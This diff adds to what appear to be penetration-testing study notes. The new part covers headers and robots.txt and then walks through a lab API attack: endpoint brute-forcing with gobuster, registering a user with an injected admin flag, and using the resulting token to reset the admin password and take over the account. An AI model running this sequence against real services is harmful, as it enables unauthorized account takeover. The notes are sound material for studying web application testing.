@@ -82,3 +82,126 @@ In the Results tab, look for requests that have different Status codes or Length
 Firefox's Debugger tool in the Web Developer menu shows page resources and content, like JavaScript frameworks, hidden input fields, software versions, and client-side controls.
 
 Right clicking on a field and navigating to the Inspect tool, we can see the related HTML, often showing us hidden form fields to test.
+
+### Inspecting HTTP Response Headers and Sitemaps
+
+We can use Burp or the browser's Network tool.
+
+Sitemaps help search engine bots crawl website and instruct bots which directories/files not to crawl.
+
+```console
+$ curl https://www.google.com/robots.txt
+```
+
+### Enumerating and Abusing APIs
+
+REST - Representational State Transfer - APIs are used for many purposes, including authentication.
+
+Gobuster can be used to brute force API endpoints.
+
+API paths typically look like /api_name/version_number
+
+```console
+$ nano pattern
+
+{GOBUSTER}/v1
+{GOBUSTER}/v2
+
+$ gobuster dir -u http://111.111.111.111:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
+
+/users/v1
+
+$ curl -i http://111.111.111.111:5002/users/v1
+
+    {
+      "email": "admin@mail.com",
+      "username": "admin"
+    }
+
+$ gobuster dir -u http://111.111.111.111:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
+
+/password
+
+$ curl -i http://111.111.111.111:5002/users/v1/admin/password
+
+HTTP/1.0 405 METHOD NOT ALLOWED
+
+// curl's default is GET - let's try POST or PUT
+// but first, let's see if /login exists.
+
+$ curl -i http://111.111.111.111:5002/users/v1/login
+{ "status": "fail", "message": "User not found"}
+
+// login exists! how do we interact with it?
+// let' stry POST or PUT
+
+$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://111.111.111.111:5002/users/v1/login
+{ "status": "fail", "message": "Password is not correct for the given username."}
+
+// now we know the API parameters are correctly formed
+// if we don't know the password, let's try to create a new user
+
+$ curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://111.111.111.111:5002/users/v1/register
+{ "status": "fail", "message": "'email' is a required property"}
+
+$ curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://111.111.111.111:5002/users/v1/register
+
+// maybe there's an administrative key we can abuse?
+
+$ curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://111.111.111.111:5002/users/v1/register
+{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
+
+// log in
+
+$ curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://111.111.111.111:5002/users/v1/login
+{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}
+
+// use this token to change the admin user's password
+
+$ curl  \
+  'http://111.111.111.111:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
+  -d '{"password": "pwned"}'
+
+
+{
+  "detail": "The method is not allowed for the requested URL.",
+  "status": 405,
+  "title": "Method Not Allowed",
+  "type": "about:blank"
+}
+
+// let's try PUT
+
+$ curl -X 'PUT' \
+  'http://111.111.111.111:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
+  -d '{"password": "pwned"}'
+
+// no error message received above? you successfully changed the admin password!
+// now, try to login as the admin user
+
+$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+
+{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}
+
+// admin account pwned!
+
+```
+
+We can recreate all of the above steps in Burp:
+
+Replicate the last admin login attempt and sent to the proxy appending the --proxy 127.0.0.1:8080 to the command.
+
+```console
+curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login --proxy 127.0.0.1:8080
+```
+
+Navigate to Burp's Repeater tab. Here, create a new empty request and fill it with the same data as we used in the above command. You should see the same behavior, and now you can test more APIs, faster.
+
+After you've tested all interesting APIs, go to the Target tab and observe the Site map. From here, you can forward saved requests to Repeater or Intruder to test further.
+
+
+
